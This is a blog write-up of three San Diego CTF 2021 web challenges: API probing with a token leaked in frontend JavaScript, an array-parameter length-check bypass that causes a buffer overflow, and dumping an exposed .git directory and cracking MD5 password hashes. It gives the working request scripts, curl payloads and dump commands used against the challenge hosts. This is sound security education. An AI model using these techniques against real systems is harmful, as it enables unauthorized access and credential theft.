---
title: San&nbsp;Diego&nbsp;CTF&nbsp;2021
tags: San&nbsp;Diego&nbsp;CTF&nbsp;2021 web tokens&nbsp;leak get-parameter-length-bypass nodejs git hashes
---

![](/images/sandiago.png)
<br>

Here, you can find write-ups of few interesting challenges from my solves in San&nbsp;Diego&nbsp;CTF&nbsp;2021 2021.

## Apollo
![](/images/apollo-1337.png)
<br>

### TL;DR
* The website's interface seems to be down.
* While investigating the network, website uses an API with the path [/api/status?verbose=](https://)
* Setting parameter verbose to any value, unlocks other **API paths**
* Investigating the responses and crafting a right request would launch the rocket
* Finally, the **crafted request**, requires an **Authorization token**, which can be found on Frontend JS pages
* Sending the correct request along with Authorization token would give the **flag**

<br>

### Solution 

Opening up the website, the page shows two messages about Frontend and Backend Servers. It says, the FrontEnd is not active, but the Backend server is working fine.

![](/images/server-error.png)


There must be some sort of API which the website must be using as refered in the challenge description

Checking out the network tab in firefox dev tools, reveals the Backend API route 
> [https://space.sdc.tf/api/status?verbose=](https://)

![](/images/inspector.png)

This route gives the following response

![](/images/api-first-resp.png)


Wait!! We got the API, but what's the verbose parameter in the URL?
May be it generates verbose response!. Trying [?verbose=1](https://), yeilds the following response

![](/images/api-resp.png)

Cool!! It revealed some other API paths. Rocket launching and fuel? The path [/rocketLaunch](https://) is more interesting according to the challenge description

Let's try sending some requests using python.

Sending a get request using python - 

```python
import requests
url = "https://space.sdc.tf/api/rocketLaunch"
print(requests.get(url).text)
```
```
request body must be json
```

Oh, it accepts JSON data. Let's try a post request with empty data

```python
import requests
data = {}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
rocket not specified
```
rocket?? May be its a key in the json data. Let's provide a random rocket.

```python
import requests
data = {"rocket": "random"}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
rocket not recognized (available: triton)
```
Oh, it accepts triton as a rocket.

```python
import requests
data = {"rocket": "triton"}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
launchTime not specified
```

And providing a random launch time - 

```python
import requests
data = {"rocket": "triton", "launchTime": "random"}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
launchTime not in hh:mm format
```
Okay !
```python
import requests
data = {"rocket": "triton", "launchTime": "00:01"}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
launchTime unapproved
```

Cool, we got a break to think here. What would be the launch time? I tried looking in the other API paths. Tried 13:37 from challenge name, but nothing really worked. But then i decided to Brute force

There are 24 hours and 60 minutes. So we get the min time to be 00:00 while the maximum time of 23:59. So the possiblities are few being **24x60=1440**

So i used a small python script!

```python
import requests
url = "https://space.sdc.tf/api/rocketLaunch"

for i in range(11, 24):
    for j in range(60):
        time = str(i).zfill(2) + ':' + str(j).zfill(2)
        data = {"rocket": "triton", "launchTime": time}
        res = requests.post(url, json=data)
        
        if len(res.text) > 21:
            print("Got the correct time: " + time)
            exit()
        
        print(time + " : " + res.text)
```
![](/images/py-resp.png)

Cool! We have the correct time now.

> Oh my bad! The description tells that the rocket was scheduled at noon today. So we can perfectly use the time 12:00, instead of brute forcing. Anyway...

So going further - 

```python
import requests
data = {"rocket": "triton", "launchTime": "12:00"}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
fuel pumpID not specified
```

Remember the fuel path [/api/fuel](https://)?

![](/images/feul.png)

We got some fuels to try out!! I tried all the five fuels. Fourth one is working.

```python
import requests
data = {"rocket": "triton", "launchTime": "12:00", "pumpID": 4}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
frontend authorization token not specified
```

Oh shit! Authorization? Where do I get the token? But it's saying **frontend authorization**. May be, trying out to seach some JS files is a great idea.

As i thought, I found a token in JS a file.

```javascript
 window.localStorage.getItem("debug") && (e.headers = {
                        Token: "yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ"
                    }), fetch("./api/status?verbose=", e).then((function(e) {
                        return e.json()
                    })).then((function(e) {
                        return n(e.longStatus)
                    }))
```

For some reason, the `token` was case-sensitive. But is was spelled `Token` in JS

So finally, providing the token in the json - 
```python
import requests
data = {"rocket": "triton", "launchTime": "12:00", "pumpID": 4, "token": "yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ"}
url = "https://space.sdc.tf/api/rocketLaunch"
res = requests.post(url, json=data)
print(res.text)
```
```
rocket launched. sdctf{0ne_sM@lL_sT3p_f0R_h@ck3r$}
```

Yayy!! The rocket got launched. We have the flag.
<br>

### Flag
> sdctf{0ne_sM@lL_sT3p_f0R_h@ck3r$}

<br>
<br>

## GETS Request
![](/images/gets-request.png)


<br>

### Disclaimer
> I did not solve the challenge in time.
     I found the solution on discord, later.
     This write-up helps you understand the detailed solution.

<br>

### TL;DR
* The website is intented to calculate the no. of primes under the given number. It takes the user provided number as a get-parameter - `n`
* Length of the get parameter is checked using **length** attribute in js
* This length check can be bypassed using passing `n` as an array like `n[]`. Now, how big the input is, array length, that is no. of elements in an array is going to stay 1. 
* And the input is passed as an argument to a binary. But there was no buffer length check inside the binary.
* So this is a classic case of Buffer Overflow!.
* Here, just generating a segmentation-fault would give us the flag.

<br>

### Source code
```javascript
const spawn = require('child_process').spawn;

const express = require('express');
const PORT = process.env.PORT || 1337;
const app = express();

const BUFFER_SIZE = 8;

app.get('/prime', (req, res) => {
  if(!req.query.n) {
    res.status(400).send('Missing required parameter n');
    return;
  }
   
  // Here to check the length of `n`, length attribute is used
  if(req.query.n.length > BUFFER_SIZE) {
    res.status(400).send('Requested n too large!');
    return;
  }

  let output = '';
  const proc = spawn(__dirname + '/primegen');
  proc.stdout.on('data', data => output += data.toString());
  proc.on('exit', () => res.send(output));

  // call our super-efficient native prime generator!
  // Here, the user input is passed as argument to primegen binary
  proc.stdin.write(`${req.query.n}\n`);
})

app.use('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.use('*', (req, res) => {
  res.status(404).send('Not Found');
});

app.listen(PORT, () => {
  console.log(`prime generator listening at http://localhost:${PORT}`)
})

```

<br>

### Solution 

#### Littile quirk in javascript
Take a look at following javascript code
Array is concatenated with a string - 

![](/images/js-quirk.png)

It's like js tries to convert the elemnts in array into strings and performs the concatenation. If multiple arguments are specifies, it adds a `,` (comma) between the elements. So it a single element is provided the `'hello'` and ``['hello']`` are treated same in certain scenario. So let's make use of this later.

<br>

#### Length check bypass
In `line 45` in above source code, there length check of `n` using `length` attribute. This attribute can also be used with the array to give number of elements in the array.
Look the code below - 

![](/images/length-check.png)

Notice the difference!!

So, if the parameter is passed as an array rather a string, that would bypass the length check. And same time the array will be treated as a string by JS and it is passed as an argument to a binary.

<br>

#### Exploitation

The request to get the primes count - 
```
curl https://gets.sdc.tf/prime?n=1000
```
```
There are exactly 192 primes under 1000
```
Trying larger number (more than 8 digits) as input -
```
curl https://gets.sdc.tf/prime?n=123456789
```
```
Requested n too large!
```
Send the same number as an array - 
```
curl https://gets.sdc.tf/prime?n[]=123456789
```
```
number malformed
```
Cool. We didn't hit the check now. But the binary doesn't accept this number.

As mentioned in the description, about `memory issues`, an ideal thought would be `memory corruption`, with a hypothesis, may be length of input is not checked in the binary but only has been checked in the JS. 

With this in mind, trying a larger number to overflow the buffer may cause a `Segmentation Fault`.

Trying larger input - 
```
curl https://gets.sdc.tf/prime?n[]=12345678955555555555555555
```
```
buffer overflow! sdctf{B3$T_0f-b0TH_w0rLds}
```

Bingo!. We got the flag.

Wait, what ??

> How could a **Segmentation Fault** would give the flag ?

The binary uses `SIGSEGV` signal and `sigsegv_handler` which are usually used for handling **segmentation faults** (Probably a bad idea! :). Here, in this case, the seg fault generates a `SIGSEGV` which evokes the `sigsegv_handler` which is just a some function to do something. Here the handler just prints the flag. Authour probably wanted to make the binary part of challenge, simple.

<br>

### Flag
> sdctf{B3$T_0f-b0TH_w0rLds}

<br>
<br>

## Git Good
![](/images/git-good.png)

<br>

### TL;DR
* Initial recon leads to robots.txt on the website with a **/admin.html** and **/.git/** paths
* The **/.git** path was not accessible directly, as the directory listing was not enabled
* But checking any standard file like **/.git/config** would give a clue that version control repository was hosted in production
* So with help of a **gitTools** we can recover all the source code of website
* Source code has an database file with a weak password hash
* Crack the password to login and we have the flag
<br>

### Solution 

Checking into robots.txt two paths were disallowed
```
User-agent: *
Disallow: /admin.html
Disallow: /.git/
```

Checking the **/admin.html** shows a login page but we still don't have the credentials.
![](/images/login.png)

Checking out the /.git/ - Not found error
```
Cannot GET /.git/
```

From here, I was not really sure about what to do. It's obvious that the challenge is related to **git** as challenge name indicates. I have no proper idea and was not able to remember that source code can even be retrived without directory listing enabled.

Then my friend [**@koimet**](https://twitter.com/k0imet_), who was well aware about this, used the tool from **internetwache** called [**GitTools**](https://github.com/internetwache/GitTools) to dump the source code of the website (easy-peasy).

He used the following command:

```
./gitdumper.sh http://cgau.sdc.tf/.git/ ./<folder-name>
```

Once he got the source, searching for important stuff revealed **users.db** sqilte file with emails and password hashes

Quickly, reading the data using sqlite - 

```
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|aaron@cgau.sdc.tf|e04efcfda166ec49ba7af5092877030e
2|chris@cgau.sdc.tf|c7c8abd4980ff956910cc9665f74f661
3|yash@cgau.sdc.tf|b4bf4e746ab3f2a77173d75dd18e591d
4|rj@cgau.sdc.tf|5a321155e7afbf0cfacf1b9d22742889
5|shawn@cgau.sdc.tf|a8252b3bbf4f3ed81dbcdcca78c6eb35
sqlite> 
```

Cracking the first hash using [hashes.com](https://hashes.com), we get the password which is `weakpassword`

Cool. Now back to login page with the email and the password!

![](/images/flag.png)

Yay! We got the flag!



<br>

### Flag
> sdctf{1298754_Y0U_G07_g00D!}

## Takeaways
* Keep an eye on parameters which might have different functionalities
* Always search for API tokens, Authorization tokens and other important data in JavaScript files
* Check if the website has version control repos in the production
* Dig into every part of the source code to exploit more!
* Try in different ways to bypass checks and other functionalities. Search for quirks. Google it.
* Try to use previous bypasses in other platforms on the current platform. May be sometimes that works or just gives a clue of further exploitation.

<br>
<br>

Happy Hacking!

<br>
<br>

> Feel free to provide feedback.